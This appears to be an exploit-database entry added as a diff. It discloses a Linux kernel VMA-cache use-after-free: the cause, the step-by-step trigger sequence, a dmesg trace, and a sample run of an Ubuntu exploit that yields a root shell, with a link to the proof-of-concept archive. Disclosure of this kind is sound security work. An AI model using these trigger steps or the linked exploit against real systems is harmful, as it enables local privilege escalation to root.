@@ -1,0 +1,130 @@
+Since commit 615d6e8756c8 ("mm: per-thread vma caching", first in 3.15),
+Linux has per-task VMA caches that contain up to four VMA pointers for
+fast lookup. VMA caches are invalidated by bumping the 32-bit per-mm
+sequence number mm->vmacache_seqnum; when the sequence number wraps,
+vmacache_flush_all() scans through all running tasks and wipes the
+VMA caches of all tasks that share current's mm.
+
+In commit 6b4ebc3a9078 ("mm,vmacache: optimize overflow system-wide
+flushing", first in 3.16), a bogus fastpath was added that skips the
+invalidation on overflow if current->mm->mm_users==1. This means that
+the following sequence of events triggers a use-after-free:
+
+[A starts as a singlethreaded process]
+A: create mappings X and Y (in separate memory areas
+   far away from other allocations)
+A: perform repeated invalidations until
+   current->mm->vmacache_seqnum==0xffffffff and
+   current->vmacache.seqnum==0xfffffffe
+A: dereference an address in mapping Y that is not
+   paged in (thereby populating A's VMA cache with
+   Y at seqnum 0xffffffff)
+A: unmap mapping X (thereby bumping
+   current->mm->vmacache_seqnum to 0)
+A: without any more find_vma() calls (which could
+   happen e.g. via pagefaults), create a thread B
+B: perform repeated invalidations until
+   current->mm->vmacache_seqnum==0xfffffffe
+B: unmap mapping Y (thereby bumping
+   current->mm->vmacache_seqnum to 0xffffffff)
+A: dereference an address in the freed mapping Y
+   (or any address that isn't present in the
+   pagetables and doesn't correspond to a valid
+   VMA cache entry)
+
+A's VMA cache is still at sequence number 0xffffffff from before the
+overflow. The sequence number has wrapped around in the meantime, back
+to 0xffffffff, and A's outdated VMA cache is considered to be valid.
+
+
+I am attaching the following reproduction files:
+
+vmacache-debugging.patch: Kernel patch that adds some extra logging for
+                          VMA cache internals.
+vma_test.c: Reproducer code
+dmesg: dmesg output of running the reproducer in a VM
+
+In a Debian 9 VM, I've tested the reproducer against a 4.19.0-rc3+
+kernel with vmacache-debugging.patch applied, configured with
+CONFIG_DEBUG_VM_VMACACHE=y.
+
+Usage:
+
+user@debian:~/vma_bug$ gcc -O2 -o vma_test vma_test.c -g && ./vma_test
+Segmentation fault
+
+
+Within around 40 minutes, I get the following warning in dmesg:
+
+=============================================
+[ 2376.292518] WARNING: CPU: 0 PID: 1103 at mm/vmacache.c:157 vmacache_find+0xbb/0xd0
+[ 2376.296813] Modules linked in: btrfs xor zstd_compress raid6_pq
+[ 2376.300095] CPU: 0 PID: 1103 Comm: vma_test Not tainted 4.19.0-rc3+ #161
+[ 2376.303650] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014
+[ 2376.305796] RIP: 0010:vmacache_find+0xbb/0xd0
+[ 2376.306963] Code: 48 85 c0 74 11 48 39 78 40 75 1f 48 39 30 77 06 48 39 70 08 77 19 83 c2 01 83 fa 04 41 0f 44 d1 83 e9 01 75 c7 31 c0 c3 f3 c3 <0f> 0b 31 c0 c3 65 48 ff 05 98 97 9b 6a c3 90 90 90 90 90 90 90 0f
+[ 2376.311881] RSP: 0000:ffffa934c1e3bec0 EFLAGS: 00010283
+[ 2376.313258] RAX: ffff8ac7eaf997d0 RBX: 0000133700204000 RCX: 0000000000000004
+[ 2376.315165] RDX: 0000000000000001 RSI: 0000133700204000 RDI: ffff8ac7f3820dc0
+[ 2376.316998] RBP: ffff8ac7f3820dc0 R08: 0000000000000001 R09: 0000000000000000
+[ 2376.318789] R10: 0000000000000000 R11: 0000000000000000 R12: ffffa934c1e3bf58
+[ 2376.320590] R13: ffff8ac7f3820dc0 R14: 0000000000000055 R15: ffff8ac7e9355140
+[ 2376.322481] FS:  00007f96165ca700(0000) GS:ffff8ac7f3c00000(0000) knlGS:0000000000000000
+[ 2376.324620] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[ 2376.326101] CR2: 0000133700204000 CR3: 0000000229d28001 CR4: 00000000003606f0
+[ 2376.327906] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[ 2376.329819] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[ 2376.331571] Call Trace:
+[ 2376.332208]  find_vma+0x16/0x70
+[ 2376.332991]  ? vfs_read+0x10f/0x130
+[ 2376.333852]  __do_page_fault+0x191/0x470
+[ 2376.334816]  ? async_page_fault+0x8/0x30
+[ 2376.335776]  async_page_fault+0x1e/0x30
+[ 2376.336746] RIP: 0033:0x555e2a2b4c37
+[ 2376.337600] Code: 05 80 e8 9c fc ff ff 83 f8 ff 0f 84 ad 00 00 00 8b 3d 81 14 20 00 e8 48 02 00 00 48 b8 00 40 20 00 37 13 00 00 bf 37 13 37 13 <c6> 00 01 31 c0 e8 cf fc ff ff 48 83 ec 80 31 c0 5b 5d 41 5c c3 48
+[ 2376.342085] RSP: 002b:00007ffd505e8d30 EFLAGS: 00010206
+[ 2376.343334] RAX: 0000133700204000 RBX: 0000000100000000 RCX: 00007f9616102700
+[ 2376.345133] RDX: 0000000000000008 RSI: 00007ffd505e8d18 RDI: 0000000013371337
+[ 2376.346834] RBP: 00007f96165e4000 R08: 0000000000000000 R09: 0000000000000000
+[ 2376.348889] R10: 0000000000000001 R11: 0000000000000246 R12: 0000000100000000
+[ 2376.350570] R13: 00007ffd505e8ea0 R14: 0000000000000000 R15: 0000000000000000
+[ 2376.352246] ---[ end trace 995fa641c5115cfb ]---
+[ 2376.353406] vma_test[1103]: segfault at 133700204000 ip 0000555e2a2b4c37 sp 00007ffd505e8d30 error 6 in vma_test[555e2a2b4000+2000]
+=============================================
+
+The source code corresponding to the warning, which is triggered because
+the VMA cache references a VMA struct that has been reallocated to
+another process in the meantime:
+
+#ifdef CONFIG_DEBUG_VM_VMACACHE
+			if (WARN_ON_ONCE(vma->vm_mm != mm))
+				break;
+#endif
+
+
+################################################################################
+
+
+Attaching an ugly exploit for Ubuntu 18.04, kernel linux-image-4.15.0-34-generic at version 4.15.0-34.37. It takes about an hour to run before popping a root shell. Usage: First compile with ./compile.sh, then run ./puppeteer. Example run:
+
+user@ubuntu-18-04-vm:~/vmacache$ ./puppeteer 
+Do Sep 20 23:55:11 CEST 2018
+puppeteer: old kmsg consumed
+got map from child!
+got WARNING
+got RSP line: 0xffff9e0bc2263c60
+got RAX line: 0xffff8c7caf1d61a0
+got RDI line: 0xffff8c7c214c7380
+reached WARNING part 2
+got R8 line: 0xffffffffa7243680
+trace consumed
+offset: 0x110
+fake vma pushed
+suid file detected, launching rootshell...
+we have root privs now...
+Fr Sep 21 00:48:00 CEST 2018
+root@ubuntu-18-04-vm:~/vmacache# 
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45497.zip
